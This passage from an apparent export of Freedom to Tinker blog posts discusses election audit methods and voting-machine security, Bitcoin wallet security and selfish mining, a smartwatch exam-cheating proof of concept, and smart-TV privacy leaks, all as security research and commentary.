printers. Why is that? It would be straightforward to add one to a standard PCOS design, and it wouldn’t much affect the price of the product (so I’ve been told by the vice president of a major voting-machine company). The reason is not that the vendors can’t or won’t make the product; it’s that PCOS-ballot serial numbers are not so straightforward to use in RLAs. When CCOS machines print serial numbers, they do so in consecutive order. Then, during a ballot-level comparison audit, when a person has to find ballot number 806.573 in a batch of 1000 ballots numbered from 806.000 to 806.999, it’s easy: just like finding page 573 in a 1000-page book. But PCOS machines must not print serial-numbers in consecutive order. In the polling place, the public (and political-party pollwatchers) can observe the order in which voters insert their ballots; so if the serial numbers are consecutive, they could use the CVR file to reconstruct who voted which way. Furthermore, even if they did print consecutive serial numbers, when the ballots drop into the ballot box they don’t fall in perfect order; they get mixed up, which helps to preserve the secret ballot. (Some manufacturers’ PCOS machines do stack ballots in perfect order, which can be viewed as a problem for voter privacy.) One solution would be to have the PCOS print the serial numbers in random order. That solves the ballot-privacy problem, and it does allow ballot-level comparison audits, but: now the human auditor has to find ballot 806.573 in a batch of 1000 randomly ordered sheets of paper, and that is extremely time-consuming. It negates the efficiency of ballot-comparison audits; you might as well use a ballot-polling audit, which does not require serial numbers at all. My previous article explained that CCOS machines can support ballot-comparison audits even without printing serial numbers: the keep the stack of ballots in order. With PCOS, we cannot use the “keep the ballots in order” trick, for two reasons: first, many PCOS machines do not stack the ballots neatly in the ballot box–this is on purpose, to preserve the privacy of the secret ballot. And even the ones that do stack ballots neatly, randomize the order of the CVR file; this is also to preserve the privacy of the secret ballot. So therefore, “keep the ballots in order” is not a solution for PCOS. Here’s a brilliant solution, which many smart people (including myself) have developed independently, and which is wrong. Instead of picking a random entry from the CVR file, and then finding that serial number in a batch of ballots, do this: pick a random sheet of paper from the batch of ballots, then look up its serial number in the CVR file. The reason this doesn’t work is that a hacked PCOS machine could cheat by printing the same (duplicate) serial number onto many ballots; and therefore, many entries in the CVR file would have no corresponding physical paper ballot. I leave it as a puzzle for the reader for how this permits cheating–in a way that would not be noticed in a ballot-comparison audit. I’ll provide the solution to this puzzle in a future article. Here’s a different solution, invented at Princeton and now a standard method: Take the batch of PCOS ballots, run it through a CCOS scanner that can print (consecutive) serial numbers, make sure the CCOS tabulation agrees with the PCOS tabulation, and then do ballot-level comparison audit using the CVR file produced by the CCOS machine. In RLA parlance, this is now called a transitive audit. It’s sound, it really does work, but it’s clumsy and laborious. The (excellent) September 2019 report by the Rhode Island RLA Working Group explains and measures in practice the pros and cons of three different RLA methods for PCOS voting: Standard ballot-comparison audits can’t be used with PCOS machines because the PCOS doesn’t print serial numbers (and if it did print serial numbers, they shouldn’t be in consecutive order); one workaround is to do a ballot-polling audit instead; another workaround is to do a batch-level comparison audit (see the report) instead; another workaround is to do a transitive audit. In summary: the most efficient RLA methods don’t work well with precinct-count optical scan voting. There ought to be a better way. I leave this as my second puzzle for the reader. In a future post, I’ll discuss a “solution” to this puzzle, but (as I’ll explain) I don’t have solid evidence that it’s really better. BMDs: In a future post I’ll discuss how these issues relate to ballot-marking devices (BMDs)."
"349","2020-03-09","2023-03-24","https://freedom-to-tinker.com/2020/03/09/why-we-cant-do-random-selection-the-other-way-round-in-pcos-rlas/","In my last article, I posed this puzzle for the reader. We want to do ballot-level comparison audits, a form of RLA (risk-limiting audit) on a precinct-count optical-scan (PCOS) voting system. This requires a serial number printed on every ballot, linked with an entry in the cast-vote-record (CVR) file. The standard method is to pick a random entry in the CVR, and find the corresponding paper ballot in the appropriate batch of ballots. If the ballots in each batch are consecutively numbered, this only takes a minute or two. But if the ballots in a batch have randomly ordered serial numbers, in order to preserve the secret ballot in a PCOS context, then it takes much longer to find the right ballot in a large batch of ballots. This slows down the RLA considerably. I thought of a brilliant solution to this problem, and only after conversation with Ron Rivest did I understand why it doesn’t work. Then, when I discussed this problem with other smart people I know, several of them came up with the same brilliant solution–and it still doesn’t work. Answer to the puzzle. What’s wrong with this solution? Here’s why it doesn’t work. Suppose the voting machines are hacked, that is, clever vote-stealing software is installed. The machines must still produce a CVR file containing a list of ballot summaries, sorted by serial number. Here’s an example: 00001   Benedict Arnold
00002   George Washington
00003   Benedict Arnold 
00004   Benedict Arnold  
00005   George Washington 
00006   Benedict Arnold 
00007   Benedict Arnold  
00008   George Washington  
00009   George Washington 
00010   Benedict Arnold So it looks like Benedict Arnold won this election, 6 to 4. In the RLA, we pick randomly from among the sheets of paper in the ballot box, and it reads, 00005 [X] George Washington [ ] Benedict Arnold That’s consistent with the CVR file, so this election passes the audit. Now, pause to reflect before we open the ballot box again (click on “read more”) and look inside. This next step would never be performed in an actual audit, but suppose we inspect every ballot in the box:  00005    [X]  George Washington             [ ] Benedict Arnold
 00002    [X]  George Washington             [ ] Benedict Arnold 
 00005    [X]  George Washington             [ ] Benedict Arnold 
 00002    [X]  George Washington             [ ] Benedict Arnold 
 00004    [ ]  George Washington             [X] Benedict Arnold 
 00005    [X]  George Washington             [ ] Benedict Arnold 
 00002    [X]  George Washington             [ ] Benedict Arnold 
 00002    [X]  George Washington             [ ] Benedict Arnold 
 00005    [X]  George Washington             [ ] Benedict Arnold 
 00002    [X]  George Washington             [ ] Benedict Arnold  What happened? Nine voters marked their ballot for George, and only one for Benedict. But the cheating PCOS printed serial numbers 5 and 2 a total of 9 times, printed serial number 4 once, and didn’t print the other serial numbers at all! In a real situation, if there are 1000 randomly ordered ballots in the bin, and the cheating PCOS lies about only 10% of the votes, it will not be easy to notice that there are duplicate serial numbers. On the other hand, suppose this election were audited by the standard method for ballot-level comparison audits: pick a random line from the CVR file, then look for the ballot. Let’s pick line 7 for example: 00007   Benedict Arnold  When the auditor looks in the bin for ballot number 00007, it’s not there! This is evidence that something is seriously wrong, and the audit will successfully detect the fraud. Furthermore, the recount of ballots in the bin, that the voters marked themselves, will give the true result: George Washington, 9 to 1. Ballot Polling Audits. This analysis applies to ballot-level comparison audits, but it does not apply to ballot polling audits. Drawing a random paper ballot from the paper-ballots pile (if it can really be done randomly enough) can be a valid method for ballot-polling audits, because the BPAs don’t need serial numbers; so “duplicate serial numbers” isn’t applicable to them."
"350","2020-03-11","2023-03-24","https://freedom-to-tinker.com/2020/03/11/finding-a-randomly-numbered-ballot/","In my previous posts, I’ve been discussing ballot-level comparison audits, a form of risk-limiting audit. Ballots are imprinted with serial numbers (after they leave the voter’s hands); during the audit, a person must find a particular numbered ballot in a batch of a thousand (more or less). If the ballot papers are numbered consecutively, that’s not too difficult. But if the serial numbers are in random order, it’s very time-consuming. An answer to the second puzzle. So here’s my next idea. Likely I’m not the first to think of it, so I can’t claim much credit. And this idea may or may not be practical; it would need to be tested in practice. Problem: You have a batch of serial-numbered ballots, like this, and you need to find the one numbered 0236000482. Take the pile of ballots, and feed them through a high-volume scanner. Scanners that can do 140 pages per minute cost about $6000. The computer attached to the scanner can use OCR (optical character recognition) software just on the corners of the page, to find and recognize the serial number. When it finds the right number, the computer commands the scanner to stop. Then the human auditor can pick up the last-scanned page, and examine it to make sure it’s the right number. If the OCR software does not work perfectly (false positives), no harm done: the human sees that it’s the wrong number, and resumes the scanner. False negatives are more annoying, but still recoverable: the human would have to search through the entire pile. Because we don’t rely on the scanner to work perfectly, because the scanner is not counting or tabulating votes, there’s no need to put this equipment through an EAC certification process. As you’ll notice, the serial number is printed in fairly low-quality, hard-to-read print. This might pose problems for the OCR software. Better-quality printing would help the OCR, but it would help the humans too, and might be worth doing in any case. Another variant of this solution is to print the serial number as a barcode in addition to human-readable digits. That would be easier for the scanner to recognize. If the PCOS tries to cheat in some way by making the barcode mismatch the human-readable number, this will be detected immediately by the human auditor. Puzzle number 3: The solution I propose in this article might work; but surely a creative person can find even better ways to support ballot-level comparison audits of PCOS machines."
"351","2019-03-14","2023-03-24","https://freedom-to-tinker.com/2019/03/14/voting-machines-i-recommend/","I’ve written several articles critical of specific voting machines, and you might wonder, are there any voting machines I like? For in-person voting (whether on election day or in early vote centers), I recommend Precinct-Count Optical Scan (PCOS) voting machines, with a ballot-marking device (BMD) available for those voters unable to mark a ballot by hand2. For vote centers that must handle a wide variety of ballot styles (covering many different election districts), it may be appropriate to use ballot-on-demand printers to produce ballots for voters to fill in with a pen. Five different U.S. companies make acceptable PCOS and BMD equipment: PCOS BMD (acceptable for use by voters unable to mark ballots with a pen) ClearBallot ClearCast ClearAccess Dominion ICP ICP320, ICX BMD ES&S DS200 ExpressVote (BMD mode only), Automark (autocast disabled) Hart Verity Scan Verity TouchWriter Unisyn OVO OVI,FVT I do not recommend all-in-one voting machines that combine ballot marking and ballot tabulation in the same paper path, such as the ES&S ExpressVote (in all-in-one mode) or the Dominion ICE. For mail-in1 ballots, I recommend Central Count Optical Scan (CCOS) voting machines with ballot-serial-number imprinters. All five companies listed above make CCOS equipment, and at least three of these companies make CCOS with serial-number imprinters: ClearBallot, ES&S and Dominion. CCOS printers from Hart (and perhaps Unisyn) do not imprint serial numbers; they can still be used in ballot-level comparison audits5 but less efficiently. I make these recommendations mainly on the basis of security: let’s have election results we can trust, even though the computers can be hacked. But PCOS or CCOS voting is also less expensive to equip than touchscreen voting. Now I will explain the basis for these recommendations. For in-person voting: Paperless Direct-Recording Electronic (DRE) “touchscreen” machines are unacceptable because, if they are hacked to cheat, there’s no way to recover the true result of the election, and no reliable way to even detect the cheating. DRE “touchscreen” machines with a behind-glass VVPAT (voter-verified paper audit trail) are not recommended because most voters don’t verify that the paper has a true recording of what they selected on the touchscreen, and it’s even more difficult to verify when the ballot is behind glass. I recommend that voters should mark optical-scan ballots with a pen, not use a touchscreen BMD, because if the BMD were to be hacked to cheat, most voters wouldn’t notice. Voters unable to mark ballots with a pen can use a BMD, but they may also choose to vote by mail with assistance from someone they trust, if such a person is available3. I don’t recommend all-in-one voting machines with ballot-marking in the same paper path with ballot tabulation for two reasons: first, the same problem as with any BMD, if the machine cheats then most voters won’t notice; and second, (if hacked) they can mark more votes on the ballot after the last time the voter has seen the paper. For small-precinct election-day voting: Election authorities should preprint optical scan “fill-in-the-oval” ballots enough to stock the precinct with enough ballots even for unexpectedly high turnout. Yes, this will mean recycling a lot of unvoted ballots at the end of the day if turnout is not unexpectedly high. You might think, “let’s use ballot-on-demand printers to avoid wasting paper.” The problem is that they require maintenance: replacement toner cartridges, backup machines if they fail entirely; and the polling places are staffed with hired-for-the-day pollworkers who cannot be expected to do this maintenance. For vote centers with many different ballot styles: In order to avoid stocking a vote center with many different piles of preprinted ballots, a ballot-on-demand printer may be appropriate. Unlike election-day polling places, vote centers can be staffed with professionals who can replace toner cartridges and do other minor maintenance, and can be equipped with a spare machine in case the main ballot-printer breaks down. By federal law (HAVA, 2002) every polling place must have an accessible voting technology that can be used by a disabled voter who cannot mark ballots by hand with a pen. To accommodate these voters it is appropriate to equip every polling place with a ballot-marking device (BMD), basically a touchscreen plus audio-sensory interface that can be used by blind voters or (via an input control switch4 interface) those with motor disabilities. A PCOS machine can handle two or three voters per minute, easily accommodating over 1000 voters in a day. In contrast, a touchscreen (DRE, BMD, or all-in-one) can handle only one voter every two or three minutes. Furthermore, for small-precinct election-day voting, if all voters are using touchscreens then each precinct will need at least two touchscreens in case one breaks down; but several precincts colocated in the same polling place can share a single PCOS (and if it breaks down, voters can still continue casting their ballots). This means that up to four times as many touchscreens are needed as PCOS machines, a significant cost difference. (In states where a single election might have as many as 50, 100, or more contests to vote on, all these numbers need to be adjusted: the PCOS machine might handle one or two voters per minute, and the DRE/BMD might handle only one voter every 5 or 10 minutes, but the ratio may be similar.) Therefore, when PCOS machines are used, each polling place will need one PCOS machine and one BMD for use by disabled voters. Depending on the manufacturer and on the contract that a state or county is able to negotiate, this costs $10,000 to $14,000 per polling place. The Dominion ImageCast Precinct ICP320, first sold in about 2009, has an interesting feature that can lower a county’s cost very substantially: it has a built-in audio BMD for use by disabled voters, so therefore one does not need to purchase a separate BMD. The ICP320’s BMD is not in the same paper path as the scanner, so it does not suffer from the insecurity of an “all-in-one” machine. I like this idea, and I’ll discuss this machine in another article at a later date. For mail-in1 ballots, one uses a Central Count Optical Scanner, which differs from a PCOS in that can count a much higher volume of ballots per minute. For efficient risk-limiting audits (RLA) of paper ballots, it’s important that the CCOS machine produces an electronic file of cast-vote records (CVR) such that each individual CVR can be connected to a specific physical paper ballot; this permits a ballot-level comparison audit. The only way (I know of) to do that is to print a serial number on each ballot. The serial number must not be printed on the ballot before the voter casts the ballot, otherwise the secret ballot would be compromised (if the voter could record the serial number, then the voter could be bribed or coerced to vote a certain way, and would have proof of how he or she voted). Therefore, the solution is to have the CCOS imprint a serial number on to the ballot while scanning it. It’s important that the serial-number printer be physically incapable of printing votes onto the ballot; this is accomplished by having a tiny dot-matrix printer that can print only on the leftmost 1 centimeter of the paper. Certain of the central-count optical scanners sold by Dominion, ES&S, and ClearBallot are available with this serial-number imprinter. Unfortunately, nobody knows of a good way to equip PCOS voting machines with a serial-number printer in such a way as to preserve the secret ballot and enable efficient ballot-level comparison audits. I’ll discuss this in another article at a later date. Footnotes: 1 “Mail-in” ballots: In some states, voters can fill out their ballots at home, then have the choice of putting their ballots in U.S. mail or dropping them off at a secure vote-deposit box maintained by election administrators. Thus, it is a slight overgeneralization to refer to these vote-at-home paper ballots as “mail-in.” 2 BMDs for voters unable to mark a ballot by hand: Some advocates for voters with disabilities strongly prefer that all voters use the same equipment, that is, all-in-one voting machines, so that the votes of disabled voters are not segregated. This is an understandable preference. Unfortunately, no known technology permits this in a way that adequately secures the votes of most voters, who cannot be relied upon to check that a paper ballot marked by BMD accurately reflects what they chose on a touchscreen. In balancing the legitimate desire for mainstreaming of disabled voters with the legitimate desire for trustworthy election outcomes, until someone finds a way to do both at once, I recommend the latter. 3 States should make vote-by-mail accessible to all disabled voters in addition to accessible in-person voting technology. Although return of marked ballots should never be done through the internet or by e-mail, it is quite reasonable to use the internet to deliver unmarked ballots to disabled voters, so that they can use the technology of their own choice (including their own computers) to mark the ballot before mailing it in or bringing it to a drop-off center. 4 A voter with a disability may use an input control switch suited for their particular needs. An example is a “sip-and-puff” device, but sip-and-puff systems are used by only about one percent of switch input control users. 5 Central Count Optical Scanners that do not tie CVRs to serial-numbered sheets of paper, such as CCOS machines from Hart, can still be used in ballot-level comparison audits, but it requires finding exactly the nth ballot in a batch. This can be made to work if the batches are kept very small, such as 25 ballots per batch."
"352","2018-10-19","2023-03-24","https://freedom-to-tinker.com/2018/10/19/continuous-roll-vvpat-under-glass-an-idea-whose-time-has-passed/","States and counties should not adopt DRE+VVPAT voting machines such as the Dominion ImageCast X and the ES&S ExpressVote. Here’s why. Touchscreen voting machines (direct-recording electronic, DRE) cannot be trusted to count votes, because (like any voting computer) a hacker may have installed fraudulent software that steals votes from one candidate and gives them to another. The best solution is to vote on hand-marked paper ballots, counted by optical scanners. Those opscan computers can be hacked too, of course, but we can recount or random-sample (“risk-limiting audit”) the paper ballots, by human inspection of the paper that the voter marked, to make sure. Fifteen years ago in the early 2000s, we computer scientists proposed another solution: equip the touchscreen DREs with a “voter verified paper audit trail” (VVPAT). The voter would select candidates on a touchscreen, the DRE would print those choices on a cash-register tape under glass, the voter would inspect the paper to make sure the machine wasn’t cheating, the printed ballot would drop into a sealed ballot box, and the DRE would count the vote electronically. If the DRE had been hacked to cheat, it could report fraudulent vote totals for the candidates, but a recount of the paper VVPAT ballots in the ballot box would detect (and correct) the fraud. By the year 2009, this idea was already considered obsolete. The problem is, no one has any confidence that the VVPAT is actually “voter verified,” for many reasons: The VVPAT is printed in small type on a narrow cash-register tape under glass, difficult for the voter to read. The voter is not well informed about the purpose of the VVPAT. (For example, in 2016 an instructional video from Buncombe County, NC showed how to use the machine; the VVPAT-under-glass was clearly visible at times, but the narrator didn’t even mention that it was there, let alone explain what it’s for and why it’s important for the voter to look at it.) It’s not clear to the voter, or to the pollworker, what to do if the VVPAT shows the wrong selections. Yes, the voter can alert the pollworker, the ballot will be voided, and the voter can start afresh. But think about the “threat model.” Suppose the hacked/cheating DRE changes a vote, and prints the changed vote in the VVPAT. If the voter doesn’t notice, then the DRE has successfully stolen a vote, and this theft will survive the recount. If the voter does notice, then the DRE is caught red-handed, except that nothing happens other than the voter tries again (and the DRE doesn’t cheat this time). You might think, if the wrong candidate is printed on the VVPAT then this is strong evidence that the machine is hacked, alarm bells should ring– but what if the voter misremembers what he entered in the touch screen? There’s no way to know whose fault it is. Voters are not very good at correlating their VVPAT-in-tiny-type-under-glass to the selections they made on the touch screen. They can remember who they selected for president, but do they really remember the name of their selection for county commissioner? And yet, historically in American elections, it’s as often the local and legislative offices where ballot-box-counting (insider) fraud has occurred. “Continuous-roll” VVPATs, which don’t cut the tape into individual ballots, compromise the secrecy of the ballot. Since any of the political-party-designated pollwatchers can see (and write down) what order people vote on the machine, and know the names of all the voters who announce themselves when signing in, they can (during a recount) correlate voters to ballots. (During a 2006 trial in the Superior Court of New Jersey, I was testifying about this issue; Judge Linda Feinberg saw this point immediately, she said it was obvious that continuous-roll VVPATs compromise the secret ballot and should not be acceptable under New Jersey law. ) For all these reasons, many states that adopted DRE+VVPAT in the period 2003-2008 have abandoned them, switching over to optical-scan voting with hand-marked (“fill in the opscan bubbles”) paper ballots, with Ballot-Marking Devices (BMDs) available for voters who can’t easily read or handle the paper. Buncombe County switched to optical scan between 2016 and 2018, because the state of North Caroline outlawed continuous-roll VVPATs). In the 2018 election, approximately* 42 states will use optical-scan, 3 states will use DRE+VVPAT, and 5 states will use paperless DREs (touchscreens). Between 2002 and 2018, many states switched from DRE to opscan, from mechanical lever machines to opscan, from punchcard to opscan, from DRE+VVPAT to opscan; but not one state that I know of switched to DRE+VVPAT. It’s not a good technology; it’s too easy for the computer (if hacked) to manipulate what appears on the paper record. New Jersey is one of those 5 states that use paperless DREs. There’s no excuse for that; if the DREs are hacked, elections can be stolen with no detection and no recourse. (Or if the DREs “make a mistake“, no recount is possible.) New Jersey should switch to voter-marked optical-scan ballots, like the rest of the country. But I am informed** that three New Jersey counties (Gloucester, Essex, and Union) are considering the purchase of new voting machines, and they’re considering only the ES&S ExpressVote and the Dominion ImageCast X. I’ve already explained why the ExpressVote is a bad idea. New Jersey (or any state) should not adopt Dominion ImageCast X DRE+VVPAT voting machine. The ImageCast X comes in several configurations, and one of them is basically a DRE+VVPAT, with a continuous-roll cash-register tape under glass. Kevin Skoglund, a software engineer in Pennsylvania, had an opportunity to examine one at a demonstration in Harrisburg, PA. He reports that it’s quite difficult to read the VVPAT-under-glass: the printing was gray (not black) on the thermal paper, the font was small, the glass window in the machine was small. Even though he has 20/20 vision, he had difficulty reading it. The ImageCast X is advertised as an optical scanner, not a DRE, because, technically, this configuration prints a QR barcode onto the VVPAT tape, then an integrated scanner immediately reads this QR code before counting the vote. This is a distinction without a difference. All the disadvantages 1,2,3,4,5 (above) apply to this format. Sure, a DRE+VVPAT is marginally better than a DRE; but that’s not the technology to adopt in 2018. New Jersey should buy optical-scan voting machines for hand-marked optical-scan ballots. Dominion makes reasonable optical-scan voting machines: the ImageCast Precinct and the ImageCast Central. ES&S makes reasonable optical-scan voting machines: the DS200, the DS450, and the DS850. Three other companies make EAC-certified optical-scan voting machines: Clearballot, Hart, and Unisyn. New Jersey (and the few other states still using paperless DREs) should buy optical-scan voting machines from any of these 5 companies. *I say “approximately” because some states use different machines in different counties. **e-mail from Robert Giles, Director of the NJ Division of Elections, to Stephanie Harris, October 11, 2018. Photo of ImageCast X VVPAT window: Kevin Skoglund, June 2018."
"353","2015-03-08","2023-03-24","https://freedom-to-tinker.com/2015/03/08/threshold-signatures-for-bitcoin-wallets-are-finally-here/","Today we are pleased to release our paper presenting a new ECDSA threshold signature scheme that is particularly well-suited for securing Bitcoin wallets. We teamed up with cryptographer Rosario Gennaro to build this scheme. Threshold signatures can be thought of as “stealth multi-signatures.” Previously, I motivated the need for threshold signatures to increase Bitcoin wallet security. For individuals, threshold signatures allow for two-factor security, or the ability to split signing control between two devices so that a single compromised device won’t put your money at risk. For businesses, threshold signatures allow for the realization of access control policies that prevent both insiders and outsiders from stealing corporate funds. As I mentioned previously, and as discussed at length in our paper, Bitcoin’s built in multisignatures are insufficient as they have serious anonymity and confidentiality drawbacks. I also discussed why building a threshold signature scheme that is compatible with the ECDSA signature scheme used by Bitcoin is so difficult. Our previous work presented a toolbox of options, none of which is perfect but which we believed were a useful starting point. Since that post, we had discussions with businesses that want to implement our techniques, and it turned out that they wanted the best-of-both-worlds properties from the crypto. In particular, they wanted a scheme that required no trusted precomputation, and in which they could realize a t-of-n access control for any t <= n. These discussions motivated us to go back to the drawing board and see if we could build a scheme that fit the need of these businesses. We realized that we could generalize a well-known 2-out-of-2 signature scheme of Mackenzie and Reiter to an n-of-n threshold signature scheme. Once we have an n-of-n scheme, we could combinatorially build an t-of-n scheme. We present the entire scheme in our paper together with applications, and we demonstrate how this scheme meets the security needs of Bitcoin based businesses and exchanges. We are confident that threshold signatures are an essential component to improving Bitcoin security without compromising on confidentiality and anonymity. To jumpstart the process of bringing our techniques to use, we have also built a prototype implementation of a two-factor secure wallet. We built a desktop client by modifying Multibit as well as an Android app. A user initiates a transaction on the computer, and the computer then begins the threshold signing protocol with the phone. The phone will show the user the transaction details and will only proceed with the transaction with the user’s explicit approval. The computer and phone use QR codes to initially pair and for all subsequent sessions they communicate over the local Wifi network. This video shows how it all works: We have released the code for our two-factor implementation, and we welcome community involvement to bring our prototype implementation to production quality as well as to build a reference implementation of our multiparty protocol."
"354","2014-04-15","2023-03-24","https://freedom-to-tinker.com/2014/04/15/bitcoin-hacks-and-thefts-the-underlying-reason/","Emin Gün Sirer has a fascinating post about how the use of NoSQL caused technical failures that led to the demise of Bitcoin exchanges Flexcoin and Poloniex. But these are only the latest in a long line of hacks of exchanges, other services, and individuals; a wide variety of bugs have been implicated. This suggests that there’s some underlying reason why Bitcoiners keep building systems that get exploited. In this post I’ll examine why. Let’s step back for a minute and talk about how we keep buildings physically secure. Locks are the first thing that come to mind, but they’re only a small part of the picture. Physical security is not just preventive but also reactive and corrective. We have intrusion-detection systems and ways of going after criminals. In particular, stolen goods are difficult to convert into cash. In the absence of the state and the rule of law, locks by themselves would do little to keep buildings secure. Software security is exactly like that. Keeping attackers out is only the first line of defense; companies spend as much on intrusion detection. As the Heartbleed bug demonstrates, we don’t have processes that will produce code that’s free of vulnerabilities given the practical constraints of software development. Relying on prevention alone, then, is simply not an option. But the extent to which practical security relies on detection over prevention may be surprising. For example, my colleague Joseph Bonneau has argued that authentication is becoming a machine learning problem. The upshot is that on many or most sites where security matters, stealing a password is not by itself sufficient to impersonate the user. Perhaps most crucially for e-commerce, banks can reverse fraudulent transactions and law enforcement of digital financial crimes is relatively competent. As a result, stolen passwords and credit card numbers are worth only fractions of a penny on the dollar. Viewed in this context, the role of cryptography and access control is merely to raise the bar sufficiently for attackers so that the risk of getting caught combined with the diminished ability to monetize break-ins skew the economics in favor of the defender. Bitcoin’s design destroys this delicate balance of prevention, detection, and correction, and puts the entire onus on preventive measures. [*] If an attacker breaks into a server containing private keys, he can steal the bitcoins immediately and irreversibly. Furthermore, a stolen bitcoin is still a bitcoin. [**] While there’s been talk of taint-tracking mechanisms to prevent thieves from cashing out, these haven’t materialized and there are fundamental technical and political difficulties with such proposals. I suspect that developers of Bitcoin services who are responsible for security consistently and dramatically underestimate what it takes to build a secure Bitcoin service. Coding and operational practices that are perfectly adequate for building a typical e-commerce site turn out to be utterly inadequate for, say, a Bitcoin exchange. Going back to the lock analogy, developers think they need a door lock when in fact they need Fort Knox. And software security as a field has simply not matured to the point where we’re even capable of building systems that rely primarily on preventive technological mechanisms in the face of persistent, financially motivated adversaries. This analysis suggests that Bitcoin businesses will continue to face a rocky future, considering that the state of software security will not improve overnight. This is why research into techniques like threshold cryptography is so important; these measures can help secure wallets even when the underlying environment is vulnerable. At the same time, perhaps the security needs of the Bitcoin ecosystem will finally provide the kick in the pants needed to improve coding practices, security reviews and audits, adversarial testing, and operational security to the point where we can build systems that are secure by design. If this happens, it will have a huge, lasting, positive impact on the overall state of Internet security. [*] These differences seem to be largely inherent, but they can be mitigated a little bit by measures such as keeping bitcoins in cold storage. [**] A recent paper led by Sarah Meiklejohn argues that it currently is difficult for thieves to launder large sums of bitcoins. If this changes, we can expect that the incentives will shift even further in favor of attackers. Thanks to Joseph Bonneau and Ed Felten for reviewing a draft."
"355","2013-12-04","2023-03-24","https://freedom-to-tinker.com/2013/12/04/cheating-on-exams-with-smartwatches/","A Belgian university recently banned all watches from exams due to the possibility of smartwatches being used to cheat. Similarly, some standardized tests in the U.S. like the GRE have banned all digital watches. These policies seems prudent, since today’s smartwatches could be used to smuggle in notes or even access websites during the test. However, their potential use for cheating goes much farther than that. As part of my undergrad research at the University of Michigan, I’ve recently been focusing on the security and privacy implications of wearable devices, including how smartwatches might be used for cheating in an exam. Surprisingly, while there’s been interest in the security implications of wearable devices, the focus within the research community has been on how these devices might be attacked rather than on how these devices challenge existing social assumptions. ConTest: A Smartwatch App for Collaborative Cheating As a proof of concept, I developed ConTest, an application for the Pebble smartwatch that shows how students could inconspicuously collaborate on multiple-choice exams in real time. ConTest allows students to select a question, vote on answers, and view the most popular solution based on all of the responses from other students taking the exam. Prior to an exam, students pair their watches with their smartphones and choose the exam that they are taking. During the exam, the smartphone—hidden in the student’s pocket or backpack—facilitates communication between the smartwatch and a cloud-based aggregation service. All user interaction during the exam takes place on the smartwatch itself with simple, inconspicuous button presses. ConTest demonstrates how hard such an application can be to detect. It displays the question number and answer by inverting a small number of pixels in digits of the time and date. For example, in the figure below, the red-circled block of missing pixels in the seven indicates that the user has voted for answer B. The purple-circled block of pixels in the five indicates that the most popular answer selected by other users is D. Similarly, the question number is encoded with missing pixels in the top date digits using a binary encoding. Although users can see this interface at close range, it’s practically invisible from more than a couple of feet away, and the cheating application looks just like a regular watch face. Disrupting Security Assumptions The obvious solution for preventing students from cheating using smartwatches is to ban watches from exams, just as Artevelde College in Belgium recently did. But the devices will continue to evolve, both decreasing in size and detectability, and increasing in capability and ubiquity. Future form factors are likely to be even less conspicuous and enable more unique attacks—think smart contact lenses or implantable smartphones. Outright bans may not be desirable or even feasible. In the long run, we will need to adapt in more drastic ways, perhaps by abandoning traditional exams as a form of student assessment. While wearable devices offer an exciting platform for new types of applications, they also upend implicit security assumptions that are built into many everyday social contexts. Testing centers assume that watches don’t talk to the Internet; casinos assume that eyeglasses aren’t heads-up displays. ConTest demonstrates that even today’s technology challenges present threat models. The time has come for the research community to start considering the attack vectors introduced by this new class of technology, and for all of us to start adapting our assumptions and threat models based on an awareness of such devices. If you’re interested in a more detailed discussion about ConTest and the security implications of smartwatches, see this technical paper I coauthored with Zakir Durumeric, Jeff Ringenberg, and J. Alex Halderman."
"356","2013-11-19","2023-03-24","https://freedom-to-tinker.com/2013/11/19/your-tv-is-spying-on-you-and-what-you-can-do-about-it/","A recent UK observer with a packet sniffer noticed that his LG “smart” TV was sending all his viewing habits back to an LG server. This included filenames from an external USB disk. Add this atop observations that Samsung’s 2012-era “smart” TVs were riddled with security holes. (No word yet on the 2013 edition.) What’s going on here? Mostly it’s just incompetence. Somebody thought it was a good idea to build these TVs with all these features and nobody ever said “maybe we need some security people on the design team to make sure we don’t have a problem”, much less “maybe all this data flowing from the TV to us constitutes a massive violation of our customers’ privacy that will land us in legal hot water.” The deep issue here is that it’s relatively easy to build something that works, but it’s significantly harder to build something that’s secure and respects privacy. What should you do about it? Decide which device or devices you intend to trust. Those get plugged into your network. The others don’t. For me, that means I trust a Google TV box and a TiVo box. My flat panel TV is too old to have an Ethernet jack, but if it did, it wouldn’t be plugged in. Yes, of course, the TiVo and Google TV boxes are also potentially leaking private data, but it’s at least under my control. TiVo provides an opt-out that, so far as anybody has noticed, seems to work. Likewise, Google TV allows third party apps to play things you download from the Internet. (I use the open-source ViMu.) Also, ask yourself what you get in return for giving up your privacy. Maybe that’s customized recommendations (useful) versus targeted advertisements (creepy). Maybe you get to influence the popularity of your shows, in an aggregate, non-personally-identifying sort of way, and help keep them on the air (fantastic!), or maybe your personal information is used to profile you, in particular, and you get targeted postal advertisements (creepy). You’d think that vendors would avoid the creepy and focus on the useful, but that isn’t a given. Of course, it would be awfully nice if regulators could catch up with this and start enforcing better behavior on these vendors. There’s no intrinsic reason that vendors can’t avoid the creepy things yet still make money (e.g., getting a referral fee when directing you to a movie that you can buy from an online streaming service), which is something that should help smooth the path to a happy medium for everybody. Meanwhile, there’s no rule that says your “smart” TV needs to be connected to anything more than an HDMI input from something else."
"357","2013-11-09","2023-03-24","https://freedom-to-tinker.com/2013/11/09/why-the-cornell-paper-on-bitcoin-mining-is-important/","Joint post with Andrew Miller, University of Maryland. Bitcoin is broken, claims a new paper by Cornell researchers Ittay Eyal and Emin Gun Sirer. No it isn’t, respond Bitcoiners. Yes it is, say the authors. Our own Ed Felten weighed in with a detailed analysis, refuting the paper’s claim that a coalition of “selfish miners” will grow in size until it controls the whole currency. But this has been disputed as well. In other words, the jury is still out. But something has been lost in all the noise about the grandiose statements — on their way to getting to their strong claim, the authors make a weaker and much more defensible argument, namely that selfish miners can earn more than their fair share of mining revenue. This is in fact a novel and interesting result, with potentially serious consequences. The well-known argument — never proven, but taken on intuitive faith — that a minority of miners can’t control the network is a special case of a more general assumption: that a coalition of miners with X% of the network’s hash power can make no more than X% of total mining revenues. Eyal and Sirer argue that this is false [1]. If X% is more than 1/3, the authors’ argument is self-contained and relatively easily verifiable, and we believe that it will hold up to scrutiny [2]. This is already a concern, but maybe it’s hard for deviant mining coalitions of such size to materialize. Things get more interesting when X% is less than a third. Here the argument for the deviant strategy relies on the attacker having a good “network position:” running a large number of Bitcoin nodes that flood the peer-to-peer messaging layer and manage to fool honest nodes about what the attacker is trying to do. Here’s the thing: this is the first time a serious issue with Bitcoin’s consensus mechanism has exploited the peer-to-peer aspect of the system. This is a problem for 